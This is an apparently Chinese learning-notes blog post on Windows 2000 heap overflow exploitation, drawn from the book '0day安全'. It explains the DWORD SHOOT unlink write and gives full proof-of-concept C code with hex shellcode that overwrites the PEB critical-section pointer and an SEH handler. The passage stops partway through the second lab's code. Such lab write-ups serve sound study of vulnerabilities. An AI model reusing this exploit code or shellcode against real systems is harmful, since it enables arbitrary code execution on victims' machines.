<p>从上图可以看出，被释放后的各块被链入快表中，形成了3条单向链表：</p>
<ul>
<li>Lookaside[2] -&gt; h2 -&gt; h1</li>
<li>Lookaside[3] -&gt; h3</li>
<li>Lookaside[4] -&gt; h4</li>
</ul>
<blockquote>
<p>0day书中图5.2.20标注的Lookaside[1], Lookaside[2], Lookaside[3]分别位于0x6E8 0x718 0x748，书中的标注有误。</p>
</blockquote>
<p>运行之后的代码，C代码中的新h2需要16 Byte空间，加上块首，需占 (2+1) x 8 Byte空间，因此在分配时已被链入Lookaside[3]的之前h3的内存0x1EB0将被新h2所使用，0x718处的指针在分配完毕后将被置0，在新h2被释放后该处指针又会恢复，整个过程较为简单，不再赘述。</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Bin</tag>
        <tag>Heap Overflow</tag>
        <tag>OllyDBG</tag>
        <tag>Security</tag>
        <tag>Windows</tag>
        <tag>Windows 2000</tag>
      </tags>
  </entry>
  <entry>
    <title>堆溢出学习笔记(Win2K) (下)</title>
    <url>/tech/heap-overflow-learning-notes-2/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Heap Overflow Learning Notes(Win2K) #2</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h2 id="堆溢出原理及利用">堆溢出原理及利用</h2>
<hr />
<h3 id="堆溢出原理">1. 堆溢出原理</h3>
<blockquote><p>堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是堆链表的修改。例如，分配就是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并稍微复杂点，但也可以看成是把若干个堆块先从空表中“卸下”，修改块首信息（大小），之后把更新的新块“链入”空表。</p>
<p>所有“卸下”和“链入”堆块的工作都发生在链表，如果我们能伪造链表结点的指针，在“卸下”和“链入”的过程中就有可能获得一次读写内存的机会。</p>
<p>堆溢出利用的精髓就是用精心构造的数据去溢出下一个堆块的块首，改写块首中的前向指针(flink)和后向指针(blink)，然后再分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。</p>
<p>我们把这种能够向内存任意位置写入任意数据的机会成为”DWORD SHOOT“。注意：DWORD SHOOT发生时，我们不但可以控制射击的目标（任意地址），还可以选用适当的子弹（4字节恶意数据）。</p>
<p>这里举一个例子来说明链表操作中DWORD SHOOT究竟是怎样发生的。将一个结点从双向链表中“卸下”的函数很可能是类似这样的。</p>
</blockquote>
<a id="more"></a>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	node -&gt; <span class="built_in">blink</span> -&gt; flink = node -&gt; flink;</span><br><span class="line">	node -&gt; flink -&gt; <span class="built_in">blink</span> = node -&gt; <span class="built_in">blink</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote><p>按照这个函数的逻辑，正常拆卸过程中链表的变化过程如图5.3.1所示。</p>
<p>当堆溢出发生时，非法数据可以淹没下一个堆块块首。这是，块首是可以被攻击者控制的，即块首中存放的前向指针（flink）和后向指针（blink）是可以被攻击者伪造的。当这个堆块被从双向链表中”卸下“时，node -&gt; blink -&gt; flink = node -&gt; flink 将把伪造的flink指针值写入伪造的blink所指的地址中去，从而发生DWORD SHOOT。这个过程如图5.3.2所示。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P163-164</cite></footer></blockquote>
<img src="/tech/heap-overflow-learning-notes-2/0day_5_3_1.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P165 -&gt; 图5.3.1">
<img src="/tech/heap-overflow-learning-notes-2/0day_5_3_2.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P165 -&gt; 图5.3.2">
<h3 id="堆溢出利用">2. 堆溢出利用</h3>
<blockquote><p>DWORD SHOOT的常用目标（Windows XP SP1之前的平台）大概可以概括为以下几类。</p>
<ol type="1">
<li><p>内存变量：修改能够影响程序执行的重要标志变量，往往可以改变程序流程。例如，更改身份验证函数的返回值就可以直接通过认证机制。2.2节中修改邻接变量的小试验就是这种利用方式的例子。在这种应用场景中，DWORD SHOOT要比栈溢出强大得多，因为栈溢出时溢出的数据必须连续，而DWORD SHOOT可以更改内存中任意地址的数据。</p></li>
<li><p>代码逻辑：修改代码段重要函数的关键逻辑有时可以达到一定攻击效果。例如，程序分支处的判断逻辑，或者把身份认证函数的调用指令覆盖为0x90(nop)。这种方法有点类似于软件破解技术中的”爆破“——通过更改一个字节而改变整个程序的流程，第1章中的破解小试验就是这种应用的例子。</p></li>
<li><p>函数返回地址：栈溢出修改函数返回地址能够劫持进程，堆溢出也一样可以利用DWORD SHOOT更改函数返回地址。但由于栈帧移位的原因，函数返回地址往往是不固定的。甚至在同一操作系统和补丁版本下连续运行两次栈状态都会有不同，故DWORD SHOOT在这种情况下有一定局限性，因为移动的靶子不好瞄准。</p></li>
<li><p>攻击异常处理机制：当程序产生异常时，Windows会转入异常处理机制。堆溢出很容易引起异常，因此异常处理机制所使用的重要数据结构往往会成为DWORD SHOOT的上等目标，这包括S.E.H（structure exception handler）、F.V.E.H（First Vectored Exception Handler）、进程环境块（P.E.B）中的U.E.F（Unhandled Exception Filter）、线程环境块（T.E.B）中存放的第一个S.E.H指针（T.E.H）。</p></li>
<li><p>函数指针：系统有时会使用一些函数指针，比如调用动态链接库中的函数、C++中的虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功劫持进程。但可惜的是，不是每一个漏洞都可以使用这项技术，这取决于软件的开发方式。</p></li>
<li><p>P.E.B中线程同步函数的入口地址：天才的黑客们发现在每个进程的P.E.B中都存放着一对同步函数指针，指向RtlEnterCriticalSection()和RtlLeaveCriticalSection()，并且在进程退出时会被ExitProcess()调用。如果能够通过DWORD SHOOT修改这对指针中的其中一个，那么在程序退出时ExitProcess()将会被骗去调用我们的shellcode。由于P.E.B的位置始终不会变化，这对指针在P.E.B中的偏移也始终不变，这使得利用堆溢出开发出适用于不同操作系统版本和补丁版本的exploit成为可能。这种方法一经提出就立刻成为Windows平台下堆溢出哭一边给的是最经典方法之一，因为静止的靶子比活动的靶子好打得多，我们只需要把枪架好，闭着眼睛扣扳机就是了。</p></li>
</ol>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P169-170</cite></footer></blockquote>
<h4 id="利用p.e.b进程环境块实施攻击">(1) 利用P.E.B（进程环境块）实施攻击</h4>
<h5 id="p.e.b利用原理">1) P.E.B利用原理</h5>
<blockquote><p>Windows为了同步进程下的多个线程，使用了一些同步措施，如锁机制（lock）、信号量（semaphore）、临界区（critical section）等。许多操作都要用到这些同步机制。</p>
<p>当进程退出时，ExitProcess()函数要做很多善后工作，其中必然需要用到临界区函数RtlEnterCriticalSection()和RtlLeaveCriticalSection()来同步线程防止“脏数据”的产生。</p>
<p>不知什么原因，微软的工程师似乎堆ExitProcess()情有独钟，因为它调用临界区的方法比较特殊，是通过进程环境块P.E.B中偏移0x20处存放的函数指针来间接完成的。具体说来就是在0x7FFDF020处存放着指向RtlEnterCriticalSection()的指针，在0x7FFDF024处存放着指向RtlLeaveCriticalSection()的指针。</p>
<p><em><strong>题外话：从Windows 2003 Server开始，微软已经修改了这里的实现。</strong></em></p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P170</cite></footer></blockquote>
<h5 id="实验">2) 实验</h5>
<p>本实验通过淹没尾块块首，来触发DWORD SHOOT以修改P.E.B中0x20处存放的指向RtlEnterCriticalSection()函数的指针，导致程序需要调用它时实际却执行了shellcode。</p>
<p>实验代码如下:</p>
<figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P171 -> heap_PEB.c</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">POC code of chapter 6.4 in book "Vulnerability Exploit and Analysis Technique"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name	: heap_PEB.c</span></span><br><span class="line"><span class="comment">author		: failwest  </span></span><br><span class="line"><span class="comment">date		: 2007.04.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">description	: demo show of heap overrun, shellcode was executed</span></span><br><span class="line"><span class="comment">			  function pointer of RtlEnterCriticalSection was changed in PEB</span></span><br><span class="line"><span class="comment">			  via DWORD shooting</span></span><br><span class="line"><span class="comment">			  Some address may need to reset via run time debugging</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Noticed		:	1 only run on windows 2000</span></span><br><span class="line"><span class="comment">				2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">				3 build into release version</span></span><br><span class="line"><span class="comment">				4 used for run time debugging</span></span><br><span class="line"><span class="comment">version		: 1.0</span></span><br><span class="line"><span class="comment">E-mail		: failwest@gmail.com</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">	Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";//200 bytes 0x90</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="comment">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="comment">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="comment">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="comment">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="comment">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="comment">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="comment">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="comment">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="comment">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="comment">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x16\x01\x1A\x00\x00\x10\x00\x00"// head of the ajacent free block</span></span><br><span class="line"><span class="comment">"\x88\x06\x52\x00\x20\xf0\xfd\x7f";</span></span><br><span class="line"><span class="comment">//0x00520688 is the address of shellcode in first heap block </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="string">"\xB8\x20\xF0\xFD\x7F"</span>  <span class="comment">//MOV EAX,7FFDF020</span></span><br><span class="line"><span class="string">"\xBB\x4C\xAA\xF8\x77"</span>  <span class="comment">//MOV EBX,77F8AA4C the address here may releated to your OS</span></span><br><span class="line"><span class="string">"\x89\x18"</span>				<span class="comment">//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">"\x88\x06\x52\x00\x20\xf0\xfd\x7f"</span>;</span><br><span class="line"><span class="comment">//0x00520688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	<span class="comment">//__asm int 3 //used to break the process</span></span><br><span class="line">	<span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译环境如下：</p>
<ul>
<li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
<li>编译器：Visual C++ 6.0</li>
<li>编译选项：默认选项</li>
<li>build版本：release版</li>
</ul>
<p>代码中第3个为最终版本的shellcode，这个shellcode效果是执行MessageBoxA()弹出一个对话框，但据0day书中解释，shellcode中调用的函数也需要使用临界区，因此在其执行过程中也需要调用P.E.B中0x20偏移处的指针指向的RtlEnterCriticalSection()函数，但该处的函数指针在shellcode执行时已经被我们掉包，因此会导致shellcode中的函数执行不成功。为了避免这个问题，需要在shellcode调用关键函数前修复该处的值，shellcode中77-79行的代码就是进行修复工作的。</p>
<p>首先，去掉代码104行处的注释，通过INT 3中断进入OllyDBG进行调试。</p>
<p>由于RtlEnterCriticalSection()函数的实际地址在不同操作系统上有所差异，因此此处需要手动确定，由于P.E.B的地址是固定的，为0x7FFDF000，因此在内存查看窗口中通过Ctrl+G并键入0x7FFDF020来到其偏移0x20处观察，得到在我的系统中RtlEnterCriticalSection()函数的地址为0x77F82060，因此将shellcode中78行处的修复代码中的该函数地址进行修改，本行整体改为&quot;6020877&quot;，其中EBX的机器码。</p>
<p>接着，观察shellcode中第92行，0day书中尾块的地址为0x00520688，而我的机器上为0x00360688，因此将其中的52修改为36即可。</p>
<p>最后，再将第104行的INT 3中断注释掉，重新编译运行程序，即可成功弹窗。这里有个问题，如果不注释掉该行代码，INT 3中断后进入OllyDBG进行调试，最终程序会终止在ntdll的内核代码中，不会成功弹窗，也不会执行到我们的shellcode，我尝试了很多修改选项或者不同断点的方式都无法解决这个问题，由于它不影响我们对利用P.E.B进行堆溢出利用的理解，因此放在后面讨论。</p>
<h5 id="关于其中细节的思考">3) 关于其中细节的思考</h5>
<p>虽然无法跟踪调试堆溢出的过程，但是我们可以观察一下堆溢出之前的堆内存的分布，当代码执行到106行memcpy()调用之前时，观察空表索引区，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-2/2_2_1_1.png" class="" title="图2.2.1.1">
<p>观察堆数据区：</p>
<img src="/tech/heap-overflow-learning-notes-2/2_2_1_2.png" class="" title="图2.2.1.2">
<p>可以看到尾块的前后向指针均指向0x178处的Freelist[0]。</p>
<p>接着执行代码到完成106行的memcpy操作，再观察对数据区：</p>
<img src="/tech/heap-overflow-learning-notes-2/2_2_1_3.png" class="" title="图2.2.1.3">
<p>由于h1处发生溢出，0x688处写入的shellcode会越界覆盖到0x758处的尾块的前后向指针，前向指针flink被修改为0x00360688，后向指针blink被修改为0x7FFDF020。由于当前尾块与Freelist[0]相互串接，而h2会申请(1+1) x 8 Byte的空间，当前Freelist[2]中没有空闲块，因此会从尾块中”分割“所需空间给h2，这需要将当前尾块从Freelist[0]中”卸下“，而前面的堆溢出利用原理中介绍过，将一个结点从双向链表中“卸下”的函数很可能是类似这样的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	node -&gt; <span class="built_in">blink</span> -&gt; flink = node -&gt; flink;</span><br><span class="line">	node -&gt; flink -&gt; <span class="built_in">blink</span> = node -&gt; <span class="built_in">blink</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，node可理解即为该节点数据区（而非块首）的地址，本例中可如下理解：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD ** node = <span class="number">0x00360758</span>; <span class="comment">//node指向尾块数据区</span></span><br><span class="line"></span><br><span class="line">node值为<span class="number">0x00360758</span>。</span><br><span class="line">*node值为<span class="number">0x00360688</span>，是被覆盖后的前向指针flink。</span><br><span class="line">*(node+<span class="number">4</span>)值为<span class="number">0x7FFDF020</span>，是被覆盖后的后向指针<span class="built_in">blink</span>。</span><br></pre></td></tr></table></figure>
<p>则如下操作就可以这样理解:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">node -&gt; flink 等价于 *(node+<span class="number">0</span>)，即*node</span><br><span class="line">node -&gt; <span class="built_in">blink</span> 等价于 *(node+<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>因此，上面的代码可以理解为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	*(*(node+<span class="number">4</span>)) = *node;</span><br><span class="line">	*(*node+<span class="number">4</span>) = *(node+<span class="number">4</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此本例可最终理解为进行了如下操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Memory(<span class="number">0x7FFDF020</span>) = <span class="number">0x00360688</span>; <span class="comment">//P.E.B DWORD SHOOT</span></span><br><span class="line">Memory(<span class="number">0x0036068C</span>) = <span class="number">0x7FFDF020</span>; <span class="comment">//指针反射</span></span><br></pre></td></tr></table></figure>
<p>如上代码中第一行向内存地址0x7FFDF020写入了DWORD值0x00360688，篡改了该处原来存储的指向临界区函数RtlEnterCriticalSection()的指针，因此在程序出错退出调用ExitProcess()时，就会需要到P.E.B便宜0x20处获得指向RtlEnterCriticalSection()函数的指针，结果获得的是shellcode的地址0x00360688，因此转而去执行shellcode。</p>
<p>但观察第二行代码，代码会向shellcode前部第5 Byte处写入DWORD 值0x7FFDF020，因此位于shellcode中的2007F会被当做机器码执行，这有可能影响shellcode的正确执行，这种现象叫做_<strong>指针反射</strong>_，好在本例中这些指令无关痛痒“，并没有影响shellcode关键代码的执行。</p>
<blockquote><p>但如果在为某个特定漏洞开发exploit时，指针反射发生且目标指针不能当做”无关痛痒“的指令安全地执行过去，那就得开动脑筋使用别的目标，或者使用跳板技术。这也是我介绍了很多种利用思路给大家的原因——要不然就只有自认倒霉了。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P177</cite></footer></blockquote>
<h4 id="通过s.e.h异常处理结构体实施攻击">(2) 通过S.E.H（异常处理结构体）实施攻击</h4>
<h5 id="s.e.h利用原理">1) S.E.H利用原理</h5>
<blockquote><p>操作系统或程序运行时，难免会遇到各种各样的错误，为了保证系统在遇到错误时不至于崩溃了，仍能够健壮稳定地继续运行下去，Windows会对运行在其中的程序提供一次补救的机会来处理错误，这种机制就是异常处理机制。</p>
<p>S.E.H即异常处理结构体（Structure Exception Handler），它是Windows异常处理机制所采用的重要数据结构。每个S.E.H包含两个DWORD指针：S.E.H链表指针和异常处理函数句柄，共8个字节，如图6.1.1所示。</p>
<p><img src="/tech/heap-overflow-learning-notes-2/0day_6_1_1.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P178 -&gt; 图6.1.1"></p>
<p>作为对S.E.H的初步了解，我们现在只需要知道一下几个要点，S.E.H链表如图6.1.2所示。</p>
<ol type="1">
<li>S.E.H结构体存放在系统栈中。</li>
<li>当线程初始化时，会自动向栈中安装一个S.E.H，作为线程默认的一场处理。</li>
<li>如果程序源代码中使用了__try{}__except{}或者Assert宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个S.E.H来实现异常处理。</li>
<li>栈中一般会同时存在多个S.E.H</li>
<li>栈中的多个S.E.H通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的S.E.H通过T.E.B（线程环境块）0字节偏移处的指针标识。</li>
<li>当异常发生时，操作系统会中断程序，并首先从T.E.B的0字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。</li>
<li>当离”事故现场“最近的异常处理函数运行失败时，将顺着S.E.H链表依次尝试其他的异常处理函数。</li>
<li>如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。</li>
</ol>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P178-179</cite></footer></blockquote>
<img src="/tech/heap-overflow-learning-notes-2/0day_6_1_2.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P179 -&gt; 图6.1.2">
<blockquote><p>从程序设计角度来讲 ，S.E.H就是在系统关闭程序之前，给程序一个预先执行设定的回调函数（call back）的机会。大概明白了S.E.H的工作原理之后 ，聪明的读者朋友们可能已经发现了问题所在。 (1) S.E.H存放在栈中，故溢出缓冲区的数据有可能淹没S.E.H。 (2) 精心制造的溢出数据可以把S.E.H中异常处理函数的入口地址更改为shellcode的起始地址。 (3) 溢出后错误的栈帧或堆块数据往往会触发异常。 (4) 当Windows开始处理溢出后的异常时，会错误地把shellcode当作异常处理函数而执行。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P178-179</cite></footer></blockquote>
<h5 id="实验-1">2) 实验</h5>
<p>本实验通过淹没尾块块首，来触发DWORD SHOOT以修改S.E.H中第一个异常处理函数的地址，导致堆溢出产生错误需执行异常处理函数时实际却执行了shellcode。</p>
<p>本实验代码与第五章中代码类似，因此作者没有在随书代码中给出，下面给出我自己修改的版本：</p>
<figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P184</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">"\x88\x06\x36\x00"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span 